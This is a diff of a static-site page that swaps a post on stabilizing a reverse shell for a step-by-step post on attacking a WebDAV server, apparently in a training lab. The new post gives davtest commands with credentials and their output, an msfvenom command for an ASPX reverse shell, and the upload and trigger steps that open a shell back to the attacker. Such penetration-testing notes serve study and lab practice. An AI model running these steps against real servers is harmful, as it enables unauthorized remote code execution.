@@ -5,32 +5,37 @@
     <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
     <meta name="generator" content="Hugo 0.154.5">
     <meta name="generator" content="Relearn 9.0.3+5fff5bc8a066e83e5f67f0de49c7dfb57379219e">
-    <meta name="description" content="After getting a reverse shell, we can stabilize it using commands below.
-python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm ctrl&#43;z stty raw -echo; fg stty rows 38 columns 116">
+    <meta name="description" content="WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
+WebDAV typically requires credentials to interact with.
+Step 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.">
     <meta name="author" content="">
     <meta name="twitter:card" content="summary">
-    <meta name="twitter:title" content="Stabilize a reverse shell :: Zenu">
-    <meta name="twitter:description" content="After getting a reverse shell, we can stabilize it using commands below.
-python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm ctrl&#43;z stty raw -echo; fg stty rows 38 columns 116">
-    <meta property="og:url" content="http://localhost:1313/posts/revshell-upgrade/index.html">
+    <meta name="twitter:title" content="WebDAV Exploitation with davtest :: Zenu">
+    <meta name="twitter:description" content="WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
+WebDAV typically requires credentials to interact with.
+Step 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.">
+    <meta property="og:url" content="http://localhost:1313/posts/webdav/index.html">
     <meta property="og:site_name" content="Zenu">
-    <meta property="og:title" content="Stabilize a reverse shell :: Zenu">
-    <meta property="og:description" content="After getting a reverse shell, we can stabilize it using commands below.
-python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm ctrl&#43;z stty raw -echo; fg stty rows 38 columns 116">
+    <meta property="og:title" content="WebDAV Exploitation with davtest :: Zenu">
+    <meta property="og:description" content="WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
+WebDAV typically requires credentials to interact with.
+Step 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.">
     <meta property="og:locale" content="en_us">
     <meta property="og:type" content="article">
     <meta property="article:section" content="Posts">
-    <meta property="article:published_time" content="2026-02-21T23:34:58+09:00">
-    <meta property="article:modified_time" content="2026-02-21T23:34:58+09:00">
-    <meta property="article:tag" content="Reverseshell">
-    <meta itemprop="name" content="Stabilize a reverse shell :: Zenu">
-    <meta itemprop="description" content="After getting a reverse shell, we can stabilize it using commands below.
-python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm ctrl&#43;z stty raw -echo; fg stty rows 38 columns 116">
-    <meta itemprop="datePublished" content="2026-02-21T23:34:58+09:00">
-    <meta itemprop="dateModified" content="2026-02-21T23:34:58+09:00">
-    <meta itemprop="wordCount" content="28">
-    <meta itemprop="keywords" content="Reverseshell">
-    <title>Stabilize a reverse shell :: Zenu</title>
+    <meta property="article:published_time" content="2026-04-15T17:59:18+09:00">
+    <meta property="article:modified_time" content="2026-04-15T17:59:18+09:00">
+    <meta property="article:tag" content="Webdav">
+    <meta property="article:tag" content="Davtest">
+    <meta itemprop="name" content="WebDAV Exploitation with davtest :: Zenu">
+    <meta itemprop="description" content="WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.
+WebDAV typically requires credentials to interact with.
+Step 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.">
+    <meta itemprop="datePublished" content="2026-04-15T17:59:18+09:00">
+    <meta itemprop="dateModified" content="2026-04-15T17:59:18+09:00">
+    <meta itemprop="wordCount" content="230">
+    <meta itemprop="keywords" content="Webdav,Davtest">
+    <title>WebDAV Exploitation with davtest :: Zenu</title>
     <link href="/images/favicon.png?1776245617" rel="icon" type="image/png">
     <link href="/css/auto-complete/auto-complete.min.css?1776245617" rel="stylesheet">
     <script src="/js/auto-complete/auto-complete.min.js?1776245617" defer></script>
@@ -56,7 +61,7 @@ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm
       window.relearn = window.relearn || {};
       // configuration
       window.relearn.min = ``;
-      window.relearn.path='\/posts\/revshell-upgrade\/index.html';
+      window.relearn.path='\/posts\/webdav\/index.html';
       window.relearn.relBasePath='..\/..';
       window.relearn.relBaseUri='..\/..';
       window.relearn.absBaseUri='http:\/\/localhost:1313';
@@ -101,7 +106,7 @@ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm
       window.relearn.markVariant();
     </script>
   </head>
-  <body class="mobile-support html" data-origin="/posts/revshell-upgrade/index.html">
+  <body class="mobile-support html" data-origin="/posts/webdav/index.html">
     <div id="R-body" class="default-animation">
       <div id="R-body-overlay"></div>
       <nav id="R-topbar" class="default-animation">
@@ -114,19 +119,27 @@ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm
             <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
 <span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
               <div class="topbar-content">
-                <div class="topbar-content-wrapper"> 
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li><a href="#step-1--enumerate-allowed-file-types-with-davtest">Step 1 — Enumerate Allowed File Types with davtest</a></li>
+    <li><a href="#step-2--generate-a-reverse-shell-payload">Step 2 — Generate a Reverse Shell Payload</a></li>
+    <li><a href="#step-3--upload-the-payload">Step 3 — Upload the Payload</a></li>
+    <li><a href="#step-4--trigger-the-shell">Step 4 — Trigger the Shell</a></li>
+  </ul>
+</nav>
                 </div>
               </div>
             </div>
           </div>
-          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Zenu</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/posts/index.html"><span itemprop="name">Posts</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Stabilize a reverse shell</span><meta itemprop="position" content="3"></li>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Zenu</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/posts/index.html"><span itemprop="name">Posts</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">WebDAV Exploitation with davtest</span><meta itemprop="position" content="3"></li>
           </ol>
           <div class="topbar-area topbar-area-end" data-area="end">
             <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
-<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/file-transfer/index.html" title="File Transfer (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/index.html" title="Posts (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
             </div>
             <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
-<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/index.html" title="Writeup (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+<span class="btn cstyle button link noborder notitle interactive"><a href="/posts/pivoting/index.html" title="Pivoting (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
             </div>
             <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
 <span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
@@ -148,24 +161,50 @@ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm
 <div class="R-taxonomy taxonomy-tags cstyle tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
   <i class="fa-fw fas fa-layer-group"></i>
   <ul>
-    <li><a class="term-link" href="/tags/reverseshell/index.html">Reverseshell</a></li>
+    <li><a class="term-link" href="/tags/davtest/index.html">Davtest</a></li>
+    <li><a class="term-link" href="/tags/webdav/index.html">Webdav</a></li>
   </ul>
 </div>
   </header>
 
-<h1 id="stabilize-a-reverse-shell">Stabilize a reverse shell</h1>
+<h1 id="webdav-exploitation-with-davtest">WebDAV Exploitation with davtest</h1>
 
-<p>After getting a reverse shell, we can stabilize it using commands below.</p>
-<ul>
-<li><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></li>
-<li><code>export TERM=xterm</code></li>
-<li><code>ctrl+z</code></li>
-<li><code>stty raw -echo; fg</code></li>
-<li><code>stty rows 38 columns 116</code></li>
-</ul>
+<h1 id="webdav-exploitation">WebDAV Exploitation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.</p>
+<p>WebDAV typically requires <strong>credentials</strong> to interact with.</p>
+<h2 id="step-1--enumerate-allowed-file-types-with-davtest">Step 1 — Enumerate Allowed File Types with davtest<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p><code>davtest</code> tests which file types can be uploaded and executed on the target WebDAV server.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>Created: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.shtml
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jsp
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jhtml
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cgi
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cfm
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.pl
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html
+PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.php
+Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
+Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx
+Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp
+Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html</code></pre></div>
+<p>The output shows both <code>.aspx</code> and <code>.asp</code> are executable — meaning we can upload a web shell or reverse shell payload in either format.</p>
+<h2 id="step-2--generate-a-reverse-shell-payload">Step 2 — Generate a Reverse Shell Payload<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Using <code>msfvenom</code>, generate an ASPX reverse shell:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o rev.aspx LHOST<span style="color:#f92672">=</span>192.168.45.212 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span></span></span></code></pre></div>
+<h2 id="step-3--upload-the-payload">Step 3 — Upload the Payload<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Upload the payload using the directory that <code>davtest</code> created in step 1:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122</span></span></code></pre></div>
+<h2 id="step-4--trigger-the-shell">Step 4 — Trigger the Shell<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>With a listener ready, browse to the uploaded file to execute it:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/rev.aspx</code></pre></div>
+<p>The reverse shell connects back to the attacker machine.</p>
 
   <footer class="footline">
-              <i class='fa-fw fas fa-calendar'></i> Feb 21, 2026
+              <i class='fa-fw fas fa-calendar'></i> Apr 15, 2026
   </footer>
 </article>
         </div>
@@ -210,10 +249,10 @@ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; export TERM=xterm
         <div class="R-sidebarmenu R-shortcutmenu-main default-animation">
           <ul class="enlarge morespace collapsible-menu">
             <li class="parent " data-nav-id="/posts/index.html"><a class="padding default-animation" href="/posts/index.html">Posts</a><ul id="R-subsections-b4e55eb7e39db1aee6d02808a2267090" class="collapsible-menu">
-            <li class="" data-nav-id="/posts/webdav/index.html"><a class="padding" href="/posts/webdav/index.html">WebDAV Exploitation with davtest</a></li>
+            <li class="active " data-nav-id="/posts/webdav/index.html"><a class="padding" href="/posts/webdav/index.html">WebDAV Exploitation with davtest</a></li>
             <li class="" data-nav-id="/posts/pivoting/index.html"><a class="padding" href="/posts/pivoting/index.html">Pivoting</a></li>
             <li class="" data-nav-id="/posts/file-transfer/index.html"><a class="padding" href="/posts/file-transfer/index.html">File Transfer</a></li>
-            <li class="active " data-nav-id="/posts/revshell-upgrade/index.html"><a class="padding" href="/posts/revshell-upgrade/index.html">Stabilize a reverse shell</a></li></ul></li>
+            <li class="" data-nav-id="/posts/revshell-upgrade/index.html"><a class="padding" href="/posts/revshell-upgrade/index.html">Stabilize a reverse shell</a></li></ul></li>
             <li class="" data-nav-id="/writeup/index.html"><a class="padding default-animation" href="/writeup/index.html">Writeup</a><ul id="R-subsections-4c552b9ca9f2e0503cd4c0d79a1b1839" class="collapsible-menu"></ul></li>
           </ul>
         </div>
